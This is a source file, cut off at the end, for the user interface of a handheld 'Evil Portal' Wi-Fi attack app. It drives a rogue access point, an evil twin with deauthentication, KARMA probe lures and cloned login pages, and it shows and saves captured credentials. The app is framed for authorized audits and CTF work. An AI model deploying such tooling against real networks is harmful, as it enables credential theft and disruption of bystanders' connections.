// Evil Portal app — on-device UI for the authorized captive-portal engine (nucleo_evilportal).
//
// AUTHORIZED USE ONLY. A rogue-AP credential-capture harness of the kind Bruce/Marauder ship, for
// security-awareness demos, auditing networks you own or have written permission to test, and CTF/lab
// work. The app opens on a consent screen and will not arm until the operator acknowledges it.
//
// UI/UX — navigable, list-driven, discoverable (no hidden keys):
//   HOME      a menu hub: Civetta / Gemello / KARMA / Loot
//   lists     dedicated full-screen pickers (nearby APs, KARMA probed SSIDs, SSID presets, pages)
//   SETUP     a clear settings list for the chosen mode + a big AVVIA
//   TAB       an options menu (Loot, Guida, Ferma) — like other apps
//   Esc/Back  steps BACK one screen (closes the app only from HOME / while running)
#include "nucleo_app.h"
#include "nucleo_exclusive.h"   // NX_SOLO: this RAM-heavy app runs in a fresh, unfragmented heap
#include "app_ui.h"
#include <M5GFX.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

extern "C" {
// Engine API. Declared here (not via REQUIRES) so nucleo_app doesn't gain a dependency on the
// engine — the symbols resolve at final link because main pulls nucleo_evilportal in.
int         nucleo_evilportal_template_count(void);
const char *nucleo_evilportal_template_name(int idx);
int         nucleo_evilportal_ssid_count(void);
const char *nucleo_evilportal_ssid_preset(int idx);
int         nucleo_evilportal_start(const char *ssid, int template_idx);   // esp_err_t (0 == ok)
void        nucleo_evilportal_stop(void);
bool        nucleo_evilportal_running(void);
int         nucleo_evilportal_clone_page(const char *open_ssid);   // F1/F2: clone a real open AP's login page
const char *nucleo_evilportal_clone_name(void);
const char *nucleo_evilportal_ssid(void);
int         nucleo_evilportal_clients(void);
int         nucleo_evilportal_captures(void);
int         nucleo_evilportal_confirmed(void);
const char *nucleo_evilportal_last_user(void);
const char *nucleo_evilportal_last_pass(void);
const char *nucleo_evilportal_logpath(void);
unsigned    nucleo_evilportal_uptime_s(void);
int         nucleo_evilportal_recent_count(void);
const char *nucleo_evilportal_recent_user(int i);
const char *nucleo_evilportal_recent_pass(int i);
// Evil-twin (clone a real AP + deauth it).
int           nucleo_evilportal_start_twin(const char *ssid, int template_idx, const unsigned char bssid[6], int channel, int authmode, bool coherent);
bool          nucleo_evilportal_twin(void);
bool          nucleo_evilportal_twin_coherent(void);
int           nucleo_evilportal_twin_channel(void);
unsigned long nucleo_evilportal_deauth_frames(void);
// Real-AP discovery, shared with the Deauth app's engine (nucleo_wifiatk).
int         nucleo_wifiatk_scan(void);
int         nucleo_wifiatk_target_count(void);
const char *nucleo_wifiatk_target_ssid(int i);
int         nucleo_wifiatk_target_channel(int i);
int         nucleo_wifiatk_target_rssi(int i);
const char *nucleo_wifiatk_target_auth(int i);
int         nucleo_wifiatk_target_authmode(int i);
const char *nucleo_wifiatk_target_fingerprint(int i);
void        nucleo_wifiatk_target_bssid_bytes(int i, unsigned char out[6]);
// KARMA: discover the SSIDs nearby devices are probing for, to use as the portal lure (async).
int         nucleo_wifiatk_karma_start(int secs);
bool        nucleo_wifiatk_karma_busy(void);
void        nucleo_wifiatk_karma_finish(void);
int         nucleo_wifiatk_karma_heap(void);
int         nucleo_wifiatk_karma_count(void);
const char *nucleo_wifiatk_karma_ssid(int i);
int         nucleo_wifiatk_karma_hits(int i);
int         nucleo_wifiatk_karma_rssi(int i);
// Beacon engine — KARMA Auto-lure feeds the captured wanted-SSIDs in and broadcasts them (mode 3 = CUSTOM).
void          nucleo_wifiatk_beacon_custom_clear(void);
bool          nucleo_wifiatk_beacon_custom_add(const char *ssid);
int           nucleo_wifiatk_beacon_start(int mode);
void          nucleo_wifiatk_beacon_stop(void);
bool          nucleo_wifiatk_beacon_running(void);
unsigned long nucleo_wifiatk_beacon_frames(void);
int           nucleo_wifiatk_beacon_count(void);
}

#include "launcher_theme.h"   // themed BG/FG/MUTED/DIM/LINE/INK + C_* accents (launcher-consistent)
#include "app_gfx.h"

// BG/FG/MUTED/DIM/LINE/INK come from launcher_theme.h (themed, shared with the launcher).
static const unsigned short EP_RED = C_RED, GRN = C_GREEN,
                            YEL = C_YELLOW, PANEL = 0x18E3, EP_CYAN = 0x5C9F;

// ---- screens ----------------------------------------------------------------
enum {
    ST_CONSENT, ST_HOME, ST_TARGETS, ST_KARMA, ST_SSID, ST_TYPE, ST_PAGE, ST_SETUP,
    ST_RUNNING, ST_LOOT, ST_GUIDE, ST_LURE, ST_SCAN, ST_KARMA_SCAN, ST_CLONE, ST_STOPPING,
};
// s_mode mirrors the engine's three flavours: 0 = Civetta (fake SSID), 1 = Gemello cattura (clone
// OPEN + deauth), 2 = Gemello coerente (clone WPA2 security, no login). HOME picks Civetta/Gemello;
// the Gemello SETUP toggles cattura<->coerente.
static int  s_mode;
static int  s_state, s_ret;              // current screen + where ST_LOOT returns to
static bool s_consented;
static bool s_menu;                      // TAB options overlay open
static int  s_menu_sel, s_home_sel, s_sel;
static int  s_ap_idx, s_ap_n;            // selected / scanned real AP (Gemello)
static int  s_km_sel;                    // KARMA list selection
static int  s_ssid_idx, s_tpl_idx;       // SSID preset / page template
static int  s_ssid_n, s_tpl_n;           // cached catalog sizes
static char s_custom[33];                // typed SSID (overrides preset when non-empty)
static int  s_typelen;
static char s_err[40];
static bool s_scan_armed, s_karma_armed, s_karma_started, s_clone_armed, s_stop_armed;
static uint32_t s_last_refresh;
static bool s_pulse;

// SETUP row ids (the visible rows depend on the mode).
enum { R_SSID, R_NET, R_SEC, R_PAGE, R_CLONE, R_GO };
static int s_rows[6], s_nrows;

static const char *effective_ssid(void)
{
    if (s_custom[0]) return s_custom;
    return (s_ssid_n > 0) ? nucleo_evilportal_ssid_preset(s_ssid_idx) : "Free WiFi";
}
static bool twin_encrypted(void)
{
    const char *a = nucleo_wifiatk_target_auth(s_ap_idx);
    return a[0] && strcmp(a, "open") != 0;
}
static int template_for_ssid(const char *ssid)
{
    int n = nucleo_evilportal_template_count();
    for (int i = 0; i < n; i++) {
        const char *nm = nucleo_evilportal_template_name(i);
        size_t ln = nm ? strlen(nm) : 0;
        if (ln < 3) continue;
        for (const char *p = ssid; *p; p++) {
            size_t k = 0;
            while (p[k] && k < ln && tolower((unsigned char)p[k]) == tolower((unsigned char)nm[k])) k++;
            if (k == ln) return i;
        }
    }
    return -1;
}
static void twin_autopick_template(void)
{
    if (s_mode == 0 || s_ap_n <= 0) return;
    int t = template_for_ssid(nucleo_wifiatk_target_ssid(s_ap_idx));
    if (t >= 0) s_tpl_idx = t;
}

// Rebuild the SETUP row layout for the current mode.
static void build_rows(void)
{
    s_nrows = 0;
    if (s_mode == 0) { s_rows[s_nrows++] = R_SSID; s_rows[s_nrows++] = R_PAGE; s_rows[s_nrows++] = R_GO; }
    else { s_rows[s_nrows++] = R_NET; s_rows[s_nrows++] = R_SEC; s_rows[s_nrows++] = R_PAGE;
           s_rows[s_nrows++] = R_CLONE; s_rows[s_nrows++] = R_GO; }
    if (s_sel >= s_nrows) s_sel = 0;
}

static void set_hint(void)
{
    if (s_menu)                       nucleo_app_set_hint("su/giu  invio scegli  tab/esc chiudi");
    else switch (s_state) {
        case ST_CONSENT:   nucleo_app_set_hint("invio accetto   esc esci"); break;
        case ST_HOME:      nucleo_app_set_hint("su/giu  invio apri  tab menu  esc esci"); break;
        case ST_TARGETS:   nucleo_app_set_hint("su/giu  invio scegli  r riscan  esc indietro"); break;
        case ST_KARMA:     nucleo_app_set_hint("invio config  a portale-ora  b beacona  r riascolta"); break;
        case ST_LURE:      nucleo_app_set_hint("invio: ferma esca   esc: indietro"); break;
        case ST_SSID:      nucleo_app_set_hint("su/giu  invio scegli  esc indietro"); break;
        case ST_TYPE:      nucleo_app_set_hint("scrivi  invio ok  canc  esc indietro"); break;
        case ST_PAGE:      nucleo_app_set_hint("su/giu  invio scegli  esc indietro"); break;
        case ST_SETUP:     nucleo_app_set_hint("su/giu  invio modifica  tab menu  esc indietro"); break;
        case ST_RUNNING:   nucleo_app_set_hint("invio ferma  tab menu  esc lascia attivo"); break;
        case ST_LOOT:      nucleo_app_set_hint("esc indietro"); break;
        case ST_GUIDE:     nucleo_app_set_hint("esc indietro"); break;
        case ST_SCAN:      nucleo_app_set_hint("scansione reti..."); break;
        case ST_KARMA_SCAN:nucleo_app_set_hint("ascolto le probe..."); break;
        case ST_CLONE:     nucleo_app_set_hint("clono la pagina..."); break;
        case ST_STOPPING:  nucleo_app_set_hint("arresto in corso..."); break;
    }
}

static void go(int st) { s_state = st; s_sel = 0; set_hint(); nucleo_app_request_draw(); }

// ---- forward decls ----------------------------------------------------------
static void ep_tab(void);
static bool ep_back(int key);

static void enter(void)
{
    s_ssid_n = nucleo_evilportal_ssid_count();
    s_tpl_n  = nucleo_evilportal_template_count();
    if (s_tpl_idx >= s_tpl_n)  s_tpl_idx = 0;
    if (s_ssid_idx >= s_ssid_n) s_ssid_idx = 0;
    static bool tpl_inited = false;
    if (!tpl_inited) { tpl_inited = true; if (s_tpl_n > 1) s_tpl_idx = 1; }   // prefer a real SD clone
    s_err[0] = 0; s_menu = false;
    nucleo_app_set_tab_handler(ep_tab);
    nucleo_app_set_back_handler(ep_back);
    s_state = nucleo_evilportal_running() ? ST_RUNNING : (s_consented ? ST_HOME : ST_CONSENT);
    set_hint();
    nucleo_app_request_draw();
}

// ---- start --------------------------------------------------------------------
static void start_portal(void)
{
    int rc;
    if (s_mode == 0) {
        rc = nucleo_evilportal_start(effective_ssid(), s_tpl_idx);
    } else {
        if (s_ap_n <= 0) { snprintf(s_err, sizeof s_err, "Nessuna rete: riscan"); set_hint(); nucleo_app_request_draw(); return; }
        unsigned char b[6]; nucleo_wifiatk_target_bssid_bytes(s_ap_idx, b);
        rc = nucleo_evilportal_start_twin(nucleo_wifiatk_target_ssid(s_ap_idx), s_tpl_idx, b,
                                          nucleo_wifiatk_target_channel(s_ap_idx),
                                          nucleo_wifiatk_target_authmode(s_ap_idx), s_mode == 2);
    }
    if (rc == 0) { s_err[0] = 0; go(ST_RUNNING); }
    else { snprintf(s_err, sizeof s_err, "Avvio fallito (err %d)", rc); set_hint(); nucleo_app_request_draw(); }
}

// KARMA needs a big contiguous block for the promiscuous RX path — on the ADV the exclusive reclaim
// alone leaves only ~16 KB largest free. Free the 32 KB launcher canvas for the duration of the sniff
// (the same trick the Recorder/SSH/ANIMA cloud jobs use); the "Karma..." screen draws direct meanwhile.
static bool s_km_screen_freed;
static void karma_free_screen(void)
{
    if (s_km_screen_freed) return;
    nucleo_app_set_direct_draw(true);   // launcher won't lazily re-grab the canvas mid-sniff
    nucleo_screen_release();            // +~32 KB contiguous
    s_km_screen_freed = true;
}
static void karma_restore_screen(void)
{
    if (!s_km_screen_freed) return;
    s_km_screen_freed = false;
    nucleo_app_set_direct_draw(false);
    for (int i = 0; i < 8 && !nucleo_screen_acquire(); i++) vTaskDelay(pdMS_TO_TICKS(20));
    nucleo_app_request_draw();
}

// ---- deferred (busy) work ----------------------------------------------------
static void tick(void)
{
    if (s_state == ST_SCAN) {
        if (!s_scan_armed) return;
        s_ap_n = nucleo_wifiatk_scan();
        if (s_ap_idx >= s_ap_n) s_ap_idx = 0;
        go(ST_TARGETS); return;
    }
    if (s_state == ST_KARMA_SCAN) {
        if (!s_karma_armed) return;
        if (!s_karma_started) {                          // kick off the async sniff once
            s_karma_started = true;
            karma_free_screen();                         // +32 KB contiguous BEFORE the sniff measures heap
            int rc = nucleo_wifiatk_karma_start(12);      // probes are sporadic -> a longer listen catches more
            if (rc != 0) {
                karma_restore_screen();
                if (rc == -5) snprintf(s_err, sizeof s_err, "Heap troppo bassa: %d B", nucleo_wifiatk_karma_heap());
                else          snprintf(s_err, sizeof s_err, "Karma non disponibile (%d)", rc);
                go(ST_HOME); return;
            }
        }
        if (nucleo_wifiatk_karma_busy()) {                // still listening — UI stays alive (1 Hz pulse)
            uint32_t t = (uint32_t)(esp_timer_get_time() / 1000000);
            if (t != s_last_refresh) { s_last_refresh = t; s_pulse = !s_pulse; }
            nucleo_app_request_draw(); return;
        }
        nucleo_wifiatk_karma_finish();                   // restore net/services on THIS (UI) task — big stack
        karma_restore_screen();                          // sniff done -> get the canvas back
        int n = nucleo_wifiatk_karma_count();
        if (n > 0) { s_km_sel = 0; go(ST_KARMA); }
        else { snprintf(s_err, sizeof s_err, "Nessuna probe sentita"); go(ST_HOME); }
        return;
    }
    if (s_state == ST_CLONE) {
        if (!s_clone_armed) return;
        int rc = nucleo_evilportal_clone_page(nucleo_wifiatk_target_ssid(s_ap_idx));
        s_tpl_n = nucleo_evilportal_template_count();
        if (rc > 0) {
            for (int i = 0; i < s_tpl_n; i++)
                if (!strcmp(nucleo_evilportal_template_name(i), nucleo_evilportal_clone_name())) { s_tpl_idx = i; break; }
            snprintf(s_err, sizeof s_err, "Pagina clonata (%d B)", rc);
        } else {
            const char *m = rc == -13 ? "Nessun captive portal" : rc == -10 ? "Join fallito"
                          : rc == -4  ? "Occupato: riprova"      : rc == -1  ? "Portale gia attivo"
                          : "Clone fallito";
            snprintf(s_err, sizeof s_err, "%s", m);
        }
        build_rows(); go(ST_SETUP); return;
    }
    if (s_state == ST_STOPPING) {
        if (!s_stop_armed) return;
        nucleo_evilportal_stop();
        nucleo_app_exit();
        return;
    }
    if (s_state != ST_RUNNING && s_state != ST_LURE) return;
    uint32_t t = (uint32_t)(esp_timer_get_time() / 1000000);
    if (t != s_last_refresh) { s_last_refresh = t; s_pulse = !s_pulse; nucleo_app_request_draw(); }
}

// ---- a reusable list renderer ------------------------------------------------
typedef void (*row_get)(int idx, char *name, int nc, char *val, int vc, unsigned short *dot);

static void ui_list(const char *title, const char *badge, int n, int sel, row_get get,
                    const char *empty, const char *footer)
{
    int h = nucleo_app_content_height();
    app_ui_title(title, EP_RED, badge);
    if (n <= 0) {
        d.setTextSize(1); d.setTextColor(DIM, BG); d.setCursor(12, 44); d.print(empty ? empty : "(vuoto)");
    }
    const int rows = 6;
    int first = sel - rows / 2; if (first < 0) first = 0;
    if (first > n - rows) first = (n > rows) ? n - rows : 0;
    for (int i = 0; i < rows && first + i < n; i++) {
        int idx = first + i, y = 24 + i * 16; bool s = (idx == sel);
        char name[40] = ""; char val[24] = ""; unsigned short dot = EP_RED;
        get(idx, name, sizeof name, val, sizeof val, &dot);
        if (s) d.fillRoundRect(6, y - 2, 228, 16, 4, PANEL);
        else   d.fillCircle(13, y + 6, 3, dot);
        d.setTextSize(1); d.setTextColor(s ? FG : MUTED, s ? PANEL : BG);
        d.setCursor(s ? 12 : 22, y + 2); d.print(name);
        if (val[0]) { int w = (int)strlen(val) * 6; d.setTextColor(s ? YEL : DIM, s ? PANEL : BG);
                      d.setCursor(226 - w, y + 2); d.print(val); }
    }
    if (n > rows) {   // tiny scroll hint
        d.setTextSize(1); d.setTextColor(DIM, BG); d.setCursor(228, 24); d.print("^");
        d.setCursor(228, 24 + (rows - 1) * 16); d.print("v");
    }
    if (footer) { d.setTextSize(1); d.setTextColor(YEL, BG); d.setCursor(10, h - 9); d.print(footer); }
}

// ---- per-screen row getters --------------------------------------------------
static const char *HOME_N[] = { "Civetta", "Gemello", "KARMA", "Loot" };
static const char *HOME_D[] = { "AP con SSID a scelta", "clona un AP reale vicino",
                                "esca dalle reti cercate", "credenziali catturate" };
static const unsigned short HOME_C[] = { GRN, EP_CYAN, YEL, EP_RED };
static void get_targets(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
{
    const char *ss = nucleo_wifiatk_target_ssid(i);
    snprintf(name, nc, "%.18s", ss[0] ? ss : "(hidden)");
    snprintf(val, vc, "c%d %ddB", nucleo_wifiatk_target_channel(i), nucleo_wifiatk_target_rssi(i));
    const char *a = nucleo_wifiatk_target_auth(i);
    *dot = (!a[0] || !strcmp(a, "open")) ? GRN : YEL;     // green = open (cloneable as open)
}
static void get_karma(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
{
    snprintf(name, nc, "%.18s", nucleo_wifiatk_karma_ssid(i));
    snprintf(val, vc, "x%d %ddB", nucleo_wifiatk_karma_hits(i), nucleo_wifiatk_karma_rssi(i));
    int r = nucleo_wifiatk_karma_rssi(i);
    *dot = r > -60 ? GRN : (r > -75 ? YEL : EP_RED);   // green = a close device wants this network
}
static void get_ssid(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
{
    if (i == 0) { snprintf(name, nc, "Scrivi un nome..."); *dot = EP_CYAN; (void)val; (void)vc; return; }
    snprintf(name, nc, "%.22s", nucleo_evilportal_ssid_preset(i - 1)); *dot = GRN; (void)val; (void)vc;
}
static void get_page(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
{
    snprintf(name, nc, "%.24s", nucleo_evilportal_template_name(i)); *dot = YEL; (void)val; (void)vc;
}
static void get_loot(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
{
    snprintf(name, nc, "%.18s", nucleo_evilportal_recent_user(i));
    snprintf(val, vc, "%.12s", nucleo_evilportal_recent_pass(i)); *dot = EP_RED;
}

// TAB options menu (context-sensitive).
static const char *menu_item(int i)
{
    if (nucleo_evilportal_running()) { static const char *R[] = { "Loot catture", "Ferma portale", "Guida" }; return R[i]; }
    static const char *N[] = { "Loot catture", "Guida" }; return N[i];
}
static int menu_count(void) { return nucleo_evilportal_running() ? 3 : 2; }
static const char *menu_title(void) { return nucleo_evilportal_running() ? "PORTALE ATTIVO" : "MENU"; }

// ---- drawing -----------------------------------------------------------------
static void draw_consent(int h)
{
    app_ui_title("Evil Portal", EP_RED, "AUTH");
    d.setTextSize(2); d.setTextColor(YEL, BG); d.setCursor(10, 28); d.print("Test autorizzati");
    const char *L[] = { "AP civetta + pagina di login", "clonata: salva su SD le",
                        "credenziali inviate.", "", "Solo reti tue o con permesso", "scritto (CTF, audit)." };
    unsigned short C[] = { FG, FG, FG, BG, MUTED, MUTED };
    d.setTextSize(1);
    for (int i = 0; i < 6; i++) { d.setTextColor(C[i], BG); d.setCursor(10, 52 + i * 11); d.print(L[i]); }
    (void)h;
}

// HOME: a two-line menu (name + description) so each choice explains itself.
static void draw_home(int h)
{
    app_ui_title("Evil Portal", EP_RED, "");
    for (int i = 0; i < 4; i++) {
        int y = 24 + i * 25; bool s = (i == s_home_sel);
        if (s) d.fillRoundRect(6, y - 2, 228, 23, 6, PANEL);
        else   d.fillCircle(13, y + 8, 3, HOME_C[i]);
        d.setTextSize(2); d.setTextColor(s ? FG : MUTED, s ? PANEL : BG); d.setCursor(s ? 12 : 22, y); d.print(HOME_N[i]);
        if (i == 3) { int c = nucleo_evilportal_captures(); if (c) { char b[8]; snprintf(b, sizeof b, "%d", c);
                      d.setTextColor(s ? YEL : EP_RED, s ? PANEL : BG); d.setCursor(210, y + 2); d.print(b); } }
        d.setTextSize(1); d.setTextColor(s ? YEL : DIM, s ? PANEL : BG); d.setCursor(s ? 12 : 22, y + 15); d.print(HOME_D[i]);
    }
    if (nucleo_evilportal_running()) { d.setTextSize(1); d.setTextColor(EP_RED, BG); d.setCursor(10, h - 9);
                                       d.print("portale ATTIVO - invio su Loot per gestirlo"); }
    else if (s_err[0]) { d.setTextSize(1); d.setTextColor(s_err[0] == 'P' ? GRN : YEL, BG);
                         d.setCursor(10, h - 9); d.print(s_err); }
}

static void row_line(int y, bool sel, const char *label, const char *val, unsigned short vcol)
{
    if (sel) { d.fillRoundRect(6, y, 228, 22, 6, EP_RED);
               d.setTextSize(2); d.setTextColor(INK, EP_RED); d.setCursor(12, y + 4); d.print(label);
               char b[24]; snprintf(b, sizeof b, "%.20s", val && val[0] ? val : "-");
               int w = (int)strlen(b) * 6; d.setTextSize(1); d.setTextColor(INK, EP_RED);
               d.setCursor(226 - w, y + 13); d.print(b); }
    else { d.fillCircle(13, y + 11, 3, vcol);
           d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(24, y + 3); d.print(label);
           char b[24]; snprintf(b, sizeof b, "%.20s", val && val[0] ? val : "-");
           int w = (int)strlen(b) * 6; d.setTextColor(DIM, BG); d.setCursor(226 - w, y + 13); d.print(b); }
}

static void draw_setup(int h)
{
    const char *badge = s_mode == 0 ? "CIVETTA" : s_mode == 1 ? "GEMELLO" : "COERENTE";
    app_ui_title("Configura", EP_RED, badge);
    for (int i = 0; i < s_nrows; i++) {
        int y = 22 + i * 19; bool s = (i == s_sel);
        char val[40];
        switch (s_rows[i]) {
            case R_SSID: snprintf(val, sizeof val, "%s%s", effective_ssid(), s_custom[0] ? " *" : "");
                         row_line(y, s, "SSID", val, GRN); break;
            case R_NET:
                if (s_ap_n > 0) snprintf(val, sizeof val, "%.10s %s", nucleo_wifiatk_target_ssid(s_ap_idx),
                                         nucleo_wifiatk_target_fingerprint(s_ap_idx));
                else snprintf(val, sizeof val, "(scegli)");
                row_line(y, s, "Rete", val, (s_ap_n > 0 && twin_encrypted() && s_mode == 1) ? YEL : EP_CYAN); break;
            case R_SEC: row_line(y, s, "Sicurezza", s_mode == 2 ? "Coerente (no login)" : "Cattura (open)",
                                 s_mode == 2 ? EP_CYAN : YEL); break;
            case R_PAGE: row_line(y, s, "Pagina", s_tpl_n ? nucleo_evilportal_template_name(s_tpl_idx) : "-", YEL); break;
            case R_CLONE: row_line(y, s, "Clona pagina", s_ap_n > 0 && !twin_encrypted() ? "rete aperta: ok" : "serve rete aperta", GRN); break;
            case R_GO:
                if (s) { d.fillRoundRect(6, y, 228, 20, 6, GRN); d.setTextSize(2); d.setTextColor(INK, GRN);
                         d.setCursor(92, y + 3); d.print("AVVIA"); }
                else  { d.drawRoundRect(6, y, 228, 20, 6, GRN); d.setTextSize(2); d.setTextColor(GRN, BG);
                        d.setCursor(92, y + 3); d.print("AVVIA"); }
                break;
        }
    }
    if (s_err[0]) { d.setTextSize(1); d.setTextColor(s_err[0] == 'P' ? GRN : EP_RED, BG);
                    d.setCursor(10, h - 9); d.print(s_err); }
}

static void draw_type(int h)
{
    app_ui_title("Nome rete", EP_RED, "");
    d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(10, 28); d.print("Scrivi l'SSID civetta:");
    d.drawRect(8, 44, 224, 20, LINE);
    d.setTextSize(2); d.setTextColor(FG, BG); d.setCursor(12, 47); d.print(s_custom);
    if (s_pulse) { int cx = 12 + s_typelen * 12; d.fillRect(cx, 47, 9, 14, EP_RED); }
    (void)h;
}

static void draw_busy(const char *title, const char *msg, int h)
{
    app_ui_title("Evil Portal", EP_RED, "");
    d.setTextSize(2); d.setTextColor(FG, BG);    d.setCursor(10, h / 2 - 14); d.print(title);
    d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(10, h / 2 + 6);  d.print(msg);
}

static void tile(int cx, const char *label, const char *val, unsigned short col)
{
    d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(cx - (int)strlen(label) * 3, 40); d.print(label);
    d.setTextSize(3); d.setTextColor(col, BG);   d.setCursor(cx - (int)strlen(val) * 9, 52); d.print(val);
}

static void draw_running(int h)
{
    app_ui_title("Evil Portal", EP_RED, "");
    if (s_pulse) d.fillCircle(150, 9, 4, EP_RED);
    d.setTextSize(1); d.setTextColor(EP_RED, BG); d.setCursor(160, 7); d.print("REC");
    if (nucleo_evilportal_twin()) { bool coh = nucleo_evilportal_twin_coherent();
        d.setTextColor(coh ? EP_CYAN : 0xF81F, BG); d.setCursor(110, 7); d.print(coh ? "TWIN-C" : "TWIN"); }
    unsigned up = nucleo_evilportal_uptime_s();
    char el[10]; snprintf(el, sizeof el, "%02u:%02u", up / 60, up % 60);
    d.setTextColor(MUTED, BG); d.setCursor(238 - (int)strlen(el) * 6, 7); d.print(el);

    int caps = nucleo_evilportal_captures();
    char ss[26]; snprintf(ss, sizeof ss, "%.24s", nucleo_evilportal_ssid());
    d.setTextSize(1); d.setTextColor(GRN, BG); d.setCursor(10, 28); d.print(ss);
    char cl[8]; snprintf(cl, sizeof cl, "%d", nucleo_evilportal_clients());
    char cp[8]; snprintf(cp, sizeof cp, "%d", caps);
    tile(62, "CLIENT", cl, FG); tile(178, "CATTURE", cp, caps ? EP_RED : MUTED);
    int conf = nucleo_evilportal_confirmed();
    if (conf > 0) { char cf[12]; snprintf(cf, sizeof cf, "conf %d", conf); d.setTextSize(1);
                    d.setTextColor(GRN, BG); d.setCursor(178 - (int)strlen(cf) * 3, 74); d.print(cf); }
    d.drawFastHLine(10, 84, 220, LINE);
    if (caps == 0) { const char *e = nucleo_evilportal_twin_coherent() ? "coerente: identita clonata, no login"
                                                                       : "in attesa di vittime...";
                     d.setTextSize(1); d.setTextColor(DIM, BG); d.setCursor(10, 92); d.print(e); }
    else { d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(10, 90); d.print("ultima:");
           char u[26]; snprintf(u, sizeof u, "%.24s", nucleo_evilportal_last_user());
           char p[26]; snprintf(p, sizeof p, "%.24s", nucleo_evilportal_last_pass());
           d.setTextColor(FG, BG); d.setCursor(58, 90); d.print(u);
           d.setTextColor(EP_RED, BG); d.setCursor(10, 101); d.print(p); }
    d.setTextSize(1); d.setTextColor(YEL, BG); d.setCursor(10, h - 9);
    if (nucleo_evilportal_twin()) { char tf[44]; snprintf(tf, sizeof tf, "%s ch%d deauth%lu  tab:menu",
                                    nucleo_evilportal_twin_coherent() ? "GEM-C" : "GEM",
                                    nucleo_evilportal_twin_channel(), nucleo_evilportal_deauth_frames()); d.print(tf); }
    else d.print("invio: ferma   tab: menu");
}

// KARMA Auto-lure: broadcasting the exact networks nearby devices were asking for.
static void draw_lure(int h)
{
    app_ui_title("Esca KARMA", EP_RED, "LURE");
    if (s_pulse) d.fillCircle(150, 9, 4, EP_RED);
    d.setTextSize(1); d.setTextColor(EP_RED, BG); d.setCursor(160, 7); d.print("TX");
    d.setTextSize(1); d.setTextColor(GRN, BG); d.setCursor(10, 30);
    char ss[34]; snprintf(ss, sizeof ss, "%d reti cercate in onda", nucleo_wifiatk_beacon_count()); d.print(ss);
    d.setTextSize(2); d.setTextColor(FG, BG); d.setCursor(10, 52);
    char fr[20]; unsigned long f = nucleo_wifiatk_beacon_frames();
    snprintf(fr, sizeof fr, "%lu beacon", f); d.print(fr);
    d.drawFastHLine(10, 80, 220, LINE);
    d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(10, 88);
    d.print("i device vedono 'la loro' rete");
    d.setTextColor(DIM, BG); d.setCursor(10, 99); d.print("e provano a collegarsi a noi");
    d.setTextColor(YEL, BG); d.setCursor(10, h - 9); d.print("invio: ferma");
}

static void draw_guide(int h)
{
    app_ui_title("Guida", EP_RED, "");
    const char *L[] = {
        "Civetta: AP finto, SSID a scelta",
        "Gemello: clona un AP reale +",
        " deauth per spostarne i client",
        " cattura=open (declassa, visibile)",
        " coerente=WPA2 reale (no login)",
        "KARMA: usa le reti che i device",
        " cercano come esca",
        "Clona pagina: copia il login di",
        " un captive aperto (CSS inclusi)",
        "Solo test autorizzati.",
    };
    d.setTextSize(1);
    for (int i = 0; i < 10; i++) { d.setTextColor(i == 9 ? YEL : (L[i][0] == ' ' ? DIM : FG), BG);
                                   d.setCursor(8, 24 + i * 11); d.print(L[i]); }
    (void)h;
}

static void draw_menu(int h)   // TAB overlay
{
    int n = menu_count();
    d.fillRoundRect(30, 26, 180, 18 + n * 18, 8, 0x0000);
    d.drawRoundRect(30, 26, 180, 18 + n * 18, 8, EP_RED);
    d.setTextSize(1); d.setTextColor(MUTED, 0x0000); d.setCursor(42, 32); d.print(menu_title());
    for (int i = 0; i < n; i++) {
        int y = 44 + i * 18; bool s = (i == s_menu_sel);
        if (s) d.fillRoundRect(36, y - 2, 168, 16, 4, EP_RED);
        d.setTextSize(1); d.setTextColor(s ? INK : FG, s ? EP_RED : 0x0000); d.setCursor(44, y + 1); d.print(menu_item(i));
    }
    (void)h;
}

static void draw(void)
{
    int top = nucleo_app_content_top(), h = nucleo_app_content_height();
    d.fillRect(0, top, 240, h, BG);
    switch (s_state) {
        case ST_CONSENT: draw_consent(h); break;
        case ST_HOME:    draw_home(h); break;
        case ST_TARGETS: ui_list("Reti vicine", "GEMELLO", s_ap_n, s_ap_idx, get_targets, "premi R per scansionare", "verde=aperta  R riscan"); break;
        case ST_KARMA:   ui_list("Reti cercate", "KARMA", nucleo_wifiatk_karma_count(), s_km_sel, get_karma, "nessuna probe", "invio: usa come civetta"); break;
        case ST_SSID:    ui_list("SSID civetta", "", s_ssid_n + 1, s_sel, get_ssid, "", nullptr); break;
        case ST_TYPE:    draw_type(h); break;
        case ST_PAGE:    ui_list("Pagina login", "", s_tpl_n, s_sel, get_page, "nessun template", nullptr); break;
        case ST_SETUP:   draw_setup(h); break;
        case ST_RUNNING: draw_running(h); break;
        case ST_LURE:    draw_lure(h); break;
        case ST_LOOT:    ui_list("Loot", "", nucleo_evilportal_recent_count(), s_sel, get_loot, "ancora nulla", "salvato su /sd/evilportal/loot"); break;
        case ST_GUIDE:   draw_guide(h); break;
        case ST_SCAN:    draw_busy("Scansione...", "Cerco le reti reali vicine.", h); s_scan_armed = true; break;
        case ST_KARMA_SCAN: {
            draw_busy("Karma...", "Ascolto chi cerca quali reti.", h);
            if (s_pulse) d.fillCircle(220, h / 2 - 7, 4, EP_RED);
            int hp = nucleo_wifiatk_karma_heap();      // confirm how much heap the sniff actually got
            if (hp > 0) { char hb[24]; snprintf(hb, sizeof hb, "heap %d B", hp);
                          d.setTextSize(1); d.setTextColor(DIM, BG); d.setCursor(10, h - 9); d.print(hb); }
            s_karma_armed = true; break;
        }
        case ST_CLONE:   draw_busy("Clono pagina...", "Mi unisco e scarico il login.", h); s_clone_armed = true; break;
        case ST_STOPPING:draw_busy("Arresto...", "Ripristino la rete OS.", h); s_stop_armed = true; break;
    }
    if (s_menu) draw_menu(h);
}

// ---- TAB menu + Back navigation ----------------------------------------------
static void ep_tab(void)
{
